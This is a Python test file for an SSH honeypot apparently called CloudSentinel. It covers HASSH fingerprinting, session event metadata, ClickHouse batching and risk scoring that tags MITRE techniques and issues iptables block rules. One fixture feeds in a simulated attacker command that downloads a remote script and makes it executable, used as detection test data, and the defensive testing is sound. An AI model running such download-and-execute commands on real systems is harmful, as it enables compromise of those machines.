# SPDX-FileCopyrightText: 2026 CloudSentinel contributors
#
# SPDX-License-Identifier: BSD-3-Clause

from __future__ import annotations

from collections import deque
from hashlib import md5
from types import SimpleNamespace
from typing import Any

from twisted.internet import defer

import cloudsentinel.core.output
from cloudsentinel.output import clickhouse
from cloudsentinel.ssh.transport import calculate_hassh


class DummyOutput(cloudsentinel.core.output.Output):
    def start(self) -> None:
        self.events: list[dict[str, Any]] = []

    def stop(self) -> None:
        pass

    def write(self, event: dict[str, Any]) -> None:
        self.events.append(event)


def _make_clickhouse_output() -> clickhouse.Output:
    output = clickhouse.Output.__new__(clickhouse.Output)
    output.batch_size = 2
    output.max_queue = 10
    output._queue = deque()
    output._sending = False
    output._stopped = False
    output._session_scores = {}
    output._session_failed_auth = {}
    output._session_techniques = {}
    output._blocked_ips = set()
    output._geoip_reader = None
    output.soar_enabled = True
    output.debug = False
    output.live_stream_enabled = False
    output.firewall_enabled = False
    output.firewall_dry_run = True
    output.firewall_path = "/sbin/iptables"
    output.risk_threshold = 70
    return output


def test_hassh_format_and_md5() -> None:
    hassh, algorithms = calculate_hassh(
        [b"curve25519-sha256", b"diffie-hellman-group14-sha256"],
        [b"chacha20-poly1305@openssh.com", b"aes128-ctr"],
        [b"hmac-sha2-256", b"hmac-sha1"],
        [b"none", b"zlib@openssh.com"],
    )

    expected = (
        "curve25519-sha256,diffie-hellman-group14-sha256;"
        "chacha20-poly1305@openssh.com,aes128-ctr;"
        "hmac-sha2-256,hmac-sha1;"
        "none,zlib@openssh.com"
    )
    assert algorithms == expected
    assert hassh == md5(expected.encode("utf-8")).hexdigest()


def test_hassh_metadata_binds_to_later_session_events() -> None:
    output = DummyOutput()
    output.emit(
        {
            "eventid": "cloudsentinel.session.connect",
            "sessionno": "S1",
            "session": "abc123",
            "src_ip": "203.0.113.10",
            "src_port": 12345,
            "dst_ip": "192.0.2.10",
            "dst_port": 22,
            "format": "connect",
        }
    )
    output.emit(
        {
            "eventid": "cloudsentinel.client.kex",
            "sessionno": "S1",
            "hassh": "abc",
            "hasshAlgorithms": "kex;enc;mac;comp",
            "format": "kex",
        }
    )
    output.emit(
        {
            "eventid": "cloudsentinel.command.input",
            "sessionno": "S1",
            "input": "uname -a",
            "format": "command",
        }
    )

    command_event = output.events[-1]
    assert command_event["hassh"] == "abc"
    assert command_event["hasshAlgorithms"] == "kex;enc;mac;comp"


def test_clickhouse_batch_flush_json_each_row() -> None:
    output = _make_clickhouse_output()
    posted: list[list[dict[str, Any]]] = []

    def post_batch(batch: list[dict[str, Any]]) -> Any:
        posted.append(batch)
        return defer.succeed(SimpleNamespace(code=200))

    output._post_batch = post_batch
    output.write({"eventid": "cloudsentinel.command.input", "session": "s1", "input": "id"})
    output.write({"eventid": "cloudsentinel.command.input", "session": "s1", "input": "uname -a"})

    assert len(posted) == 1
    assert len(posted[0]) == 2
    assert not output._queue


def test_clickhouse_failed_write_requeues_batch() -> None:
    output = _make_clickhouse_output()

    def post_batch(batch: list[dict[str, Any]]) -> Any:
        return defer.succeed(SimpleNamespace(code=500))

    output._post_batch = post_batch
    output._enqueue({"eventid": "cloudsentinel.command.input", "session": "s1", "input": "id"})
    output._flush()

    assert len(output._queue) == 1


def test_soar_scores_mitre_and_dry_run_by_default() -> None:
    output = _make_clickhouse_output()
    event = {
        "eventid": "cloudsentinel.command.input",
        "session": "s1",
        "src_ip": "8.8.8.8",
        "input": "wget http://example.invalid/a.sh && chmod +x a.sh",
    }

    output._annotate_soar(event)

    assert event["cloudsentinel_risk_score"] == 45
    assert event["cloudsentinel_mitre_techniques"] == ["T1105", "T1222"]
    assert event["cloudsentinel_soar_action"] == "none"


def test_soar_live_firewall_requires_explicit_enablement() -> None:
    output = _make_clickhouse_output()
    calls: list[tuple[Any, str, list[str], None]] = []

    class FakeReactor:
        def spawnProcess(self, process_protocol: Any, path: str, args: list[str], env: None) -> None:
            calls.append((process_protocol, path, args, env))

    output._reactor = FakeReactor()
    output.firewall_enabled = True
    output.firewall_dry_run = False

    action = output._block_ip({"src_ip": "8.8.8.8"})

    assert action == "iptables_block"
    assert calls[0][1:] == (
        "/sbin/iptables",
        ["iptables", "-A", "INPUT", "-s", "8.8.8.8", "-j", "DROP"],
        None,
    )
